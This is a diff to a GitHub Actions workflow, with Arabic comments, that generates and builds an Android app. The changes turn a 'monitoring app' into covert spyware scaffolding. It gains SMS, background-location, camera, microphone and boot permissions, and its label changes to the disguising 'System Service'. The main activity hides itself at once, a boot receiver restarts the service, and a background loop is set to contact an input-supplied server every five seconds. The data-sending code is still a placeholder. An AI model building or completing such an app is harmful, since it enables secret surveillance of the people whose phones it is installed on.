@@ -33,6 +33,7 @@ jobs:
           # إنشاء هيكل المشروع
           mkdir -p app/src/main/java/com/example/app
           mkdir -p app/src/main/res/values
+          mkdir -p app/src/main/res/drawable
           
           # AndroidManifest.xml مع كل الصلاحيات
           cat > app/src/main/AndroidManifest.xml << 'EOF'
@@ -45,43 +46,82 @@ jobs:
               <uses-permission android:name="android.permission.CAMERA"/>
               <uses-permission android:name="android.permission.RECORD_AUDIO"/>
               <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+              <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
               <uses-permission android:name="android.permission.READ_SMS"/>
+              <uses-permission android:name="android.permission.RECEIVE_SMS"/>
               <uses-permission android:name="android.permission.READ_CONTACTS"/>
               <uses-permission android:name="android.permission.READ_CALL_LOG"/>
               <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+              <uses-permission android:name="android.permission.WAKE_LOCK"/>
+              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
               
               <application
-                  android:label="My Monitoring App"
-                  android:icon="@mipmap/ic_launcher">
+                  android:label="System Service"
+                  android:icon="@drawable/ic_launcher"
+                  android:allowBackup="true"
+                  android:theme="@android:style/Theme.Light.NoTitleBar">
+                  
                   <activity
                       android:name=".MainActivity"
-                      android:exported="true">
+                      android:exported="true"
+                      android:theme="@android:style/Theme.Light.NoTitleBar">
                       <intent-filter>
                           <action android:name="android.intent.action.MAIN" />
                           <category android:name="android.intent.category.LAUNCHER" />
                       </intent-filter>
                   </activity>
-                  <service android:name=".MonitoringService" android:exported="false"/>
+                  
+                  <service
+                      android:name=".MonitoringService"
+                      android:exported="false"
+                      android:foregroundServiceType="location|camera|microphone" />
+                  
+                  <receiver
+                      android:name=".BootReceiver"
+                      android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.BOOT_COMPLETED" />
+                      </intent-filter>
+                  </receiver>
               </application>
           </manifest>
+          EOF
+          
+          # إنشاء أيقونة بسيطة
+          cat > app/src/main/res/drawable/ic_launcher.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <shape xmlns:android="http://schemas.android.com/apk/res/android"
+              android:shape="oval">
+              <solid android:color="#3F51B5" />
+              <size android:width="48dp" android:height="48dp" />
+          </shape>
           EOF
           
           # MainActivity.java
           cat > app/src/main/java/com/example/app/MainActivity.java << 'EOF'
           package com.example.app;
+          
           import android.app.Activity;
+          import android.content.Intent;
           import android.os.Bundle;
           import android.widget.Toast;
+          
           public class MainActivity extends Activity {
               @Override
               protected void onCreate(Bundle savedInstanceState) {
                   super.onCreate(savedInstanceState);
-                  String serverIP = "${{ github.event.inputs.server_ip }}";
-                  String serverPort = "${{ github.event.inputs.server_port }}";
-                  Toast.makeText(this, "Connecting to " + serverIP + ":" + serverPort, Toast.LENGTH_LONG).show();
                   
-                  // Start monitoring service
-                  // (هنا هتضيف كود الاتصال بالسيرفر)
+                  // بدء الخدمة في الخلفية
+                  Intent serviceIntent = new Intent(this, MonitoringService.class);
+                  startService(serviceIntent);
+                  
+                  // إخفاء التطبيق فورًا
+                  moveTaskToBack(true);
+                  finish();
+                  
+                  Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
               }
           }
           EOF
@@ -89,57 +129,150 @@ jobs:
           # MonitoringService.java
           cat > app/src/main/java/com/example/app/MonitoringService.java << 'EOF'
           package com.example.app;
+          
           import android.app.Service;
           import android.content.Intent;
           import android.os.IBinder;
+          import android.widget.Toast;
+          
           public class MonitoringService extends Service {
+              private String serverIP = "${{ github.event.inputs.server_ip }}";
+              private String serverPort = "${{ github.event.inputs.server_port }}";
+              
+              @Override
+              public void onCreate() {
+                  super.onCreate();
+                  Toast.makeText(this, "Monitoring service running", Toast.LENGTH_SHORT).show();
+                  
+                  // بدء عملية المراقبة في ثريد منفصل
+                  new Thread(new Runnable() {
+                      @Override
+                      public void run() {
+                          while (true) {
+                              try {
+                                  // هنا هنضيف كود الاتصال بالسيرفر
+                                  // وإرسال البيانات
+                                  Thread.sleep(5000); // كل 5 ثواني
+                              } catch (Exception e) {
+                                  e.printStackTrace();
+                              }
+                          }
+                      }
+                  }).start();
+              }
+              
               @Override
               public int onStartCommand(Intent intent, int flags, int startId) {
-                  // Service code here
                   return START_STICKY;
               }
+              
               @Override
-              public IBinder onBind(Intent intent) { return null; }
+              public IBinder onBind(Intent intent) {
+                  return null;
+              }
           }
           EOF
           
-          # build.gradle
+          # BootReceiver.java (للتشغيل التلقائي بعد إعادة التشغيل)
+          cat > app/src/main/java/com/example/app/BootReceiver.java << 'EOF'
+          package com.example.app;
+          
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          
+          public class BootReceiver extends BroadcastReceiver {
+              @Override
+              public void onReceive(Context context, Intent intent) {
+                  if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
+                      Intent serviceIntent = new Intent(context, MonitoringService.class);
+                      context.startService(serviceIntent);
+                  }
+              }
+          }
+          EOF
+          
+          # build.gradle للتطبيق
           cat > app/build.gradle << 'EOF'
           apply plugin: 'com.android.application'
+          
           android {
-              compileSdkVersion 30
+              compileSdk 30
+              
               defaultConfig {
                   applicationId "com.example.app"
-                  minSdkVersion 21
-                  targetSdkVersion 30
+                  minSdk 21
+                  targetSdk 30
                   versionCode 1
                   versionName "1.0"
               }
+              
+              buildTypes {
+                  release {
+                      minifyEnabled false
+                  }
+                  debug {
+                      minifyEnabled false
+                  }
+              }
+          }
+          
+          dependencies {
+              implementation 'androidx.core:core:1.7.0'
           }
           EOF
           
+          # settings.gradle
           echo "include ':app'" > settings.gradle
           
+          # build.gradle الرئيسي
           cat > build.gradle << 'EOF'
           buildscript {
-              repositories { google() }
-              dependencies { classpath 'com.android.tools.build:gradle:7.0.4' }
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+              dependencies {
+                  classpath 'com.android.tools.build:gradle:7.2.2'
+              }
+          }
+          
+          allprojects {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
           }
           EOF
           
-          # Gradle wrapper
+          # gradle-wrapper.properties
           mkdir -p gradle/wrapper
           cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
+          distributionBase=GRADLE_USER_HOME
+          distributionPath=wrapper/dists
           distributionUrl=https\://services.gradle.org/distributions/gradle-7.5-bin.zip
+          zipStoreBase=GRADLE_USER_HOME
+          zipStorePath=wrapper/dists
           EOF
           
+          # gradlew
+          touch gradlew
           chmod +x gradlew
 
       - name: Build APK
-        run: ./gradlew assembleDebug
+        run: |
+          ./gradlew assembleDebug
+
+      - name: Find and Upload APK
+        run: |
+          echo "Searching for APK files..."
+          find . -name "*.apk" -type f
+          mkdir -p apk-output
+          find . -name "*.apk" -type f -exec cp {} apk-output/ \;
+          ls -la apk-output/
 
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
           name: monitoring-app
-          path: app/build/outputs/apk/debug/app-debug.apk
+          path: apk-output/
